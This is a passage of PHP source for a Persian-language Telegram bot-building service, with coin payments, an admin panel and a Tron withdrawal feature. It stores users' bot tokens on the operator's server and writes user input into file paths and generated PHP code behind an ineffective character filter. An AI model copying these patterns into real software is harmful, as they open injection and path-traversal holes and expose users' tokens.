'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
جهت ساخت این ربات به 10 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
",
'parse_mode'=>'HTML',
]);
        }
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
elseif($bloxk !== "ok" && $state == "uplod" and $text != '🔙 | بازگشت‌'){
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :|
",
]);
}
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌ توکن شما معتبر نمی باشد تصحیح کنید!
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
" ]);
if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/media");
mkdir("PaMicKCreaT/$un/dataPaMicK");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$class = file_get_contents("source/uplod/index.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
file_put_contents("PaMicKCreaT/$un/index.php",$class);
copy("source/uplod/jdf.php","PaMicKCreaT/$un/jdf.php");
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/indexpa.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/bot.txt","uplod");
file_put_contents("dataPaMicK/bot/$un/jdf.php",$jdf);
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
file_put_contents("PaMicKCreaT/$un/indexs.php",$class);
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/index.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 📥 | آپلودر

ایدی ربات : @$un 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
file_put_contents('databaceBot/' . $from_id, '1');
} else {
file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 10;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}

//===============panel==================
if($text1 == "/panel" or $text1 == "پنل" or $text1 == "↩ | بازگشت‌"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/state.txt","none");
file_put_contents("dataPaMicK/step.txt","none");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
file_put_contents("dataPaMicK/$from_id/step.txt","none");
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"
به پنل مدیریت خوش آمدید ♥️🤙🏻
➖➖➖➖➖➖➖➖
♻️ وضعیت ربات : $onof
➖➖➖➖➖➖➖➖
🔸 پینگ ربات : $load[0]
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"آمار ربات شما 📊"]],
[['text'=>"تنظیم امتیازات 🔢"],['text'=>"کسب درامد از بات 🎊"]],
[['text'=>'تنظیم متن ها 📝'],['text'=>"مدیریت ادمین ها 👤"]],
[['text'=>"دیگر تنظیمات ⚙"],['text'=>'بخش پیام 📬']],
[['text'=>'بخش مبادلات 💸'],['text'=>'بخش خاموش و روشن 👮‍♂️']],
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}

elseif($text1 == "کسب درامد از بات 🎊"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'راهنما 📚']],
[['text'=>'دریافت موجودی 🎉'],['text'=>'موجودی 🎁']],
[['text'=>"پنل"]],
],
'resize_keyboard'=>true
])
]);
}
}

elseif($text1 == "راهنما 📚"){
if($from_id == $Dev){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"
به بخش راهنما کسب درامد خوش امدید 🤝

در اپدیت جدید رباتساز بزرگ پامیک درگاه پرداخت ترون افزوده شد 🤖

کارایی این بخش چیست کاربران برای افزایش موجودی خود که ترون دارند میتوانند اینجا ترون رو واریز کنند و سکه خریداری کنند 💸

بخش برداشت موجودی چجوری خواهد بود بعد رسیدن به حد نصاب برداشت موجودی که حداقل 30 ترون در شبکه است با ارسال پیام به ادمین پشتیبانی منتخب ( @imSmarte ) موجودی خود را برداشت میکنید 🎊

در موقع برداشت مقدار 30 درصد از ترون شما به عنوان کارمزد - بهینه سازی سرور - اپدیت ربات و دیگر کار ها برداشته خواهد شد ⚠️
",
]);
}
}

if ($text1 == "موجودی 🎁") {
if ($from_id == $Dev) {
$files = array("trons.txt", "kooltrons.txt", "witrons.txt");
$allFilesExist = true;
foreach ($files as $file) {
if (!file_exists("admin/" . $file)) {
$allFilesExist = false;
break;
}
}
if ($allFilesExist) {
$karba = ($witrons * 30) / 100;
$kars = $witrons - $karba;
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
👨‍🏫 - آیدی عددی مالک ربات : $Dev
🪙 - تعدادی موجودی ( ترون ) باقی مانده : $trons
✨ - کل ترون های برداشت شده تا الان : $witrons
📉 - کل سود برداشتی بدون 30 درصد کارمزد : $witrons
📈 - کل سود برداشتی با 30 درصد کارمزد : $kars
",
]);
} else {
foreach ($files as $file) {
if (!file_exists("admin/" . $file)) {
file_put_contents("admin/" . $file, "0");
}
}
$karba = ($witrons * 30) / 100;
$kars = $witrons - $karba;
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
👨‍🏫 - آیدی عددی مالک ربات : $Dev
🪙 - تعدادی موجودی ( ترون ) باقی مانده : $trons
✨ - کل ترون های برداشت شده تا الان : $witrons
📉 - کل سود برداشتی بدون 30 درصد کارمزد : $karbed
📈 - کل سود برداشتی با 30 درصد کارمزد : $kars
",
]);
}
}
}

elseif($text1 == "برداشت موجودی 🎉"){
if($trons >= 30){
if($from_id == $Dev){
file_put_contents("dataPaMicK/$from_id/step.txt","bardasht");
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"
مقدار ترونی که میخواهید برداشت کنید را ارسال کنید",
'reply_to_message_id' => $message_id,
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],'resize_keyboard'=>true])
]);
}}else{
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"
حد نصاب برداشت 30 ترون می باشد",
]);
}
}

elseif($step =="bardasht" && $text !="↩ | بازگشت‌" ){
if(is_numeric($text) and $text >= 30 and $text <= $trons){
if (is_numeric($text)) {
file_put_contents("dataPaMicK/$from_id/step.txt","bardasht1");
file_put_contents("dataPaMicK/$from_id/state.txt","$text");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
💼 - آدرس کیف پول ( ولت ترون ) خود را ارسال کنید

⚠️ - توجه در صورت ارسال اشتباه آدرس کیف پول هیچ گونه مبلغی برای شما برگشت داده نخواهد شد !!
",
]);
}}else{
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"
تعداد رو بین 30 ترون الی $trons وارد کنید
",
'reply_to_message_id' => $message_id,
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],'resize_keyboard'=>true])
]);
}}

elseif($step =="bardasht1" && $text !="↩ | بازگشت‌" ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"✅ - #برداشت_موفق

مقدار $state ترون برداشت کردید طی 1 الی 72 ساعت آینده برای شما واریز خواهد شد

💼 - آدرس کیف پول شما : $text

⚠️ - مقدار 30 درصد کارمزد از مقدار موجودی شما برداشته خواهد شد و سپس واریز میوشد !
",
]);
file_put_contents("dataPaMicK/$from_id/step.txt","none");
$trons = file_get_contents("admin/trons.txt");
$tronss = $trons - $state;
file_put_contents("admin/trons.txt", "$tronss");
$tronsk = file_get_contents("admin/kooltrons.txt");
$tronsssk = $tronsk + $state;
file_put_contents("admin/kooltrons.txt", "$tronsssk");
$tronsw = file_get_contents("admin/witrons.txt");
$tronssw = $tronsw + $state;
file_put_contents("admin/witrons.txt", "$tronssw");
$txt = urlencode("برداشت جدید انجام شد \n مقدار $state ترون \n ولت $text️");
file_get_contents("https://api.telegram.org/bot".$tokentext."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
}
//=============================================================//
elseif($text1 == "بخش پیام 📬"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"✉️ ارسال پیام"],['text'=>"📨 فوروارد پیام"]],
[['text'=>"‼️ | اطلاعات کاربر"]],
[['text'=>"پنل"]],
],
'resize_keyboard'=>true
])
]);
}else{
sendMessage($chat_id,"
شما @$suporttt نیسی🤣🌹","HTML");
}
}

//=============================================================//
elseif($text1 == "مدیریت ادمین ها 👤"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت ادمین ها خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'افزودن ادمین 2 🔰'],['text'=>'افزودن ادمین 1 🔰']],
[['text'=>'لیست ادمین ها 👨‍💻'],['text'=>"حذف ادمین ها 💢"]],
[['text'=>"پنل"]],
],
'resize_keyboard'=>true
])
]);
}else{
sendMessage($chat_id,"
شما @LoTaRiee نیسی🤣🌹","HTML");
}
}

elseif($text1 == "حذف ادمین ها 💢"){
if($from_id == $Dev){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت حذف ادمین ها خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'حذف ادمین 2 💢'],['text'=>'حدف ادمین 1 💢']],
[['text'=>"پنل"]],
],
'resize_keyboard'=>true
])
]);
}else{
sendMessage($chat_id,"
شما @LoTaRiee نیسی🤣🌹","HTML");
}
}

elseif($text1 == "لیست ادمین ها 👨‍💻" && $chat_id == $Dev){
if($from_id == $Dev){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
🔖 لیست ادمین های فعلی :

1️⃣ ایدی ادمین اول : `$admin`
2️⃣ ایدی ادمین دوم : `$admin2`

برای کپی کردن برروی اون ایدی کلیک کنید !

",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}


elseif($text1 == "حدف ادمین 1 💢" && $chat_id == $Dev){
if($from_id == $Dev){
if (file_exists("admin/admin1.json")) {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت حذف شد",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"مدیریت ادمین ها 👤"]],
],
'resize_keyboard'=>true,
])
]);
unlink("admin/admin1.json");
file_put_contents("admin/admin1.json","تنظیم نشده است ! 💢");
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ادمینی وجود ندارد",
]);
}}}

elseif($text1 == "حذف ادمین 2 💢" && $chat_id == $Dev){
if($from_id == $Dev){
if (file_exists("admin/admin2.json")) {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت حذف شد !",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"مدیریت ادمین ها 👤"]],
],
'resize_keyboard'=>true,
])
]);
unlink("admin/admin1.json");
file_put_contents("admin/admin2.json","تنظیم نشده است ! 💢");
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ادمینی وجود ندارد",
]); 
}}}

elseif($text1 == "افزودن ادمین 1 🔰" && $chat_id == $Dev){
if($from_id == $Dev){
file_put_contents("dataPaMicK/$from_id/step.txt","admin1");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ایدی عددی کاربر مورد نظر را ارسال کنید 👤",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="admin1" && $text !="پنل" ){
if (is_numeric($text)) {
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/admin1.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
bot('sendMessage',[
'chat_id'=>$text,
'text'=>"شما ادمین ربات شدید ! 😉",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا عدد ارسال کنید",
]);
}}

elseif($text1 == "افزودن ادمین 2 🔰" && $chat_id == $Dev){
if($from_id == $Dev){
file_put_contents("dataPaMicK/$from_id/step.txt","admin2");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ایدی عددی کاربر مورد نظر را ارسال کنید 👤",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="admin2" && $text !="پنل" ){
if (is_numeric($text)) {
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/admin2.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
bot('sendMessage',[
'chat_id'=>$text,
'text'=>"شما ادمین ربات شدید ! 😉",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا عدد ارسال کنید",
]);
}}
//=============================================================//
elseif($text1 == "بخش خاموش و روشن 👮‍♂️"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'✅ | روشن ربات'],['text'=>'❌ | خاموش ربات']],
[['text'=>'👾 | روشن ساخت ربات'],['text'=>'👾 | خاموش ساخت ربات']],
[['text'=>'👤 | روشن پشتیبانی'],['text'=>'👤 | خاموش پشتیبانی']],
[['text'=>'🔐 | روشن جوین اجباری'],['text'=>'🔐 | خاموش جوین اجباری']],
[['text'=>'📊 | روشن نمایش آمار'],['text'=>'📊 | خاموش نمایش آمار']],
[['text'=>"پنل"]],
],
'resize_keyboard'=>true
])
]);
}else{
sendMessage($chat_id,"
شما @LoTaRiee نیسی🤣🌹","HTML");
}
}

elseif($text1 == "👾 | خاموش ساخت ربات"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/creatorreebot.txt","off");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ساخت ربات خاموش شد ❌",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}}

elseif($text1 == "👾 | روشن ساخت ربات"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/creatorreebot.txt","on");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ساخت ربات روشن شد ✅",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}}



elseif($text1 == "📊 | خاموش نمایش آمار"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/namayeshamar.txt","off");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"نمایش آمار خاموش شد ❌",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}}

elseif($text1 == "📊 | روشن نمایش آمار"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/namayeshamar.txt","on");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"نمایش آمار روشن شد ✅",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}}

elseif($text1 == "🔐 | خاموش جوین اجباری"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/joinej.txt","OFF");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"جوین اجباری خاموش شد ❌",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}}

elseif($text1 == "🔐 | روشن جوین اجباری"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/joinej.txt","ON");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"جوین اجباری روشن شد ✅",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}}
//=============================================================//
elseif($text == "دیگر تنظیمات ⚙"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"حذف همه ربات های ساخته شده 🗑"]],
[['text'=>"🔖 دریافت لیست ممبر"]],

[['text'=>"پنل"]],
],
'resize_keyboard'=>true
])
]);
}else{
sendMessage($chat_id,"
شما @$suporttt نیسی🤣🌹","HTML");
}
}

elseif($text == "حذف همه ربات های ساخته شده 🗑"){ 
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
 file_put_contents("dataPaMicK/$from_id/state.txt","none"); 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"آیا واقعا ربات ها را حذف کنم 😳؟", 
'parse_mode'=>"MarkDown",   
'reply_markup'=>json_encode([ 
'keyboard'=>[ 
[['text'=>"حذف کن🩸"],['text'=>"『 بازگشت 』"]],
], 
"resize_keyboard" => true ,
"one_time_keyboard" => true,

]) 
]);
file_put_contents('dataPaMicK/'.$from_id."/step.txt","none");
exit;
}}

if($text == "حذف کن🩸" && $chat_id == $Dev ){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"همه ربات ها با موفقیت حذف شد 😑🦖",
]);
deleteFolder('PaMicKCreaT');
sleep('2');
mkdir('PaMicKCreaT');
}}
//=============================================================//
elseif($text1 == "تنظیم متن ها 📝"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"👤 | تنظیم متن بنر زیرمجوعه"]],
[['text'=>"🏞 | تنظیم عکس زیرمجموعه"],['text'=>"🔗 | تنظیم عکس اسپانسر"]],
[['text'=>"⛔ | تنظیم متن خاموشی"],['text'=>'🎗 | تنظیم متن دریافت توکن']],
[['text'=>"🤖 | تنظیم متن اسپانسر"],['text'=>"🛍 | تنظیم متن خرید"]],
[['text'=>'🔙 | تنظیم متن برگشت'],['text'=>'📝 | تنظیم متن استارت']],
[['text'=>"پنل"]],

],
'resize_keyboard'=>true
])
]);
}else{
sendMessage($chat_id,"
شما @$suporttt نیسی🤣🌹","HTML");
}
}

elseif($text == '🎉 | ساخت کد هدیه'){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","code free");
file_put_contents("dataPaMicK/$from_id/kodomadmin.txt", "$first_name");
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"☢ کد مورد نظر رو وارد کنید",
     'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩ | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step == "code free" && $text != "↩ | بازگشت‌"){
file_put_contents("dataPaMicK/$from_id/step.txt","number coins");
file_put_contents("admin/code/$text.txt","false");
file_put_contents("dataPaMicK/$from_id/amir.txt",$text);
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"حالا تعداد سکه ها را تعیین کنید. تعداد را بین 1 الی 10 سکه وارد کنید",
     'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩ | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($step == "number coins"){
if(is_numeric($text) and $text >= 1 and $text <= 10){
file_put_contents("admin/coins/$amir.txt",$text);
file_put_contents("dataPaMicK/$from_id/step.txt","none");
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"☢ کد ثبت شد.",
     'parse_mode'=>'html',
 ]);
bot('SendPhoto', [
'chat_id'=> "@[CHANNEL]",
'photo'=>"https://dynamic.brandcrowd.com/asset/logo/e8009c68-61f0-4688-97aa-d6b0368b2fc6/logo?v=4&text=$amir",
'caption'=>"
کد هدیه جدید ساخته شد 💰

تعداد سکه : $text 🔰
",
'parse_mode'=>'HTML',
 'reply_markup'=>json_encode([
 'inline_keyboard'=>[
[['text'=>"رباتساز بزرگ ما 🤖",'url'=>"https://t.me/$bot"]],
]
])
]);
}else{
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"
تعداد سکه را بین 1 تا 10 ارسال کنید !!!!
    
",
'reply_to_message_id' => $message_id,
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],'resize_keyboard'=>true])
]);
}}

//=============================================================//
elseif($text1 == "تنظیم امتیازات 🔢"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت متن ها خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"امتیاز هر زیرمجموعه 👨‍🏫"],['text'=>'قیمت هر سکه 🪙']],
[['text'=>"پنل"]],
],
'resize_keyboard'=>true
])
]);
}
}

elseif($text == "امتیاز هر زیرمجموعه 👨‍🏫" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","emtiazzzirmod");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
مقدار رو بین 1 الی 5 ارسال کن
",
'disable_web_page_preview' => true,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="emtiazzzirmod" && $text !="پنل" ){
if(is_numeric($text) and $text >= 1 and $text <= 5){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/emtiazzzirmod.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}else{
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"
تعداد سکه را بین 1 تا 5 ارسال کنید !!!!
    
",
'reply_to_message_id' => $message_id,
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],'resize_keyboard'=>true])
]);
}}

elseif($text == "قیمت هر سکه 🪙" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","coinprices");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
قیمت هر دونه سکه را از بین 600 تک تومن تا 1500 تک تومن وارد کنید",
'disable_web_page_preview' => true,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="coinprices" && $text !="پنل" ){
if(is_numeric($text) and $text >= 600 and $text <= 1500){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/coinprices.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}else{
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"
قیمت هر دونه سکه را از بین 600 تک تومن تا 1500 تک تومن وارد کنید
",
'reply_to_message_id' => $message_id,
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],'resize_keyboard'=>true])
]);
}}

elseif($text == "🏞 | تنظیم عکس زیرمجموعه" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","linkzirmajooo");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"لینک عکس خود را ارسال کنید 

نمونه لینک : https://t.me/PaMicKWeb/139",
'disable_web_page_preview' => true,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="linkzirmajooo" && $text !="پنل" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/linkzirmajooo.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}

elseif($text == "🔗 | تنظیم عکس اسپانسر" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","linkesponser");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"لینک عکس خود را ارسال کنید 

نمونه لینک : https://t.me/PaMicKWeb/139",
'disable_web_page_preview' => true,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="linkesponser" && $text !="پنل" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/linkesponser.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}


elseif($text == "⛔ | تنظیم متن خاموشی" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","khamoshiii");
bot('sendMessage',[
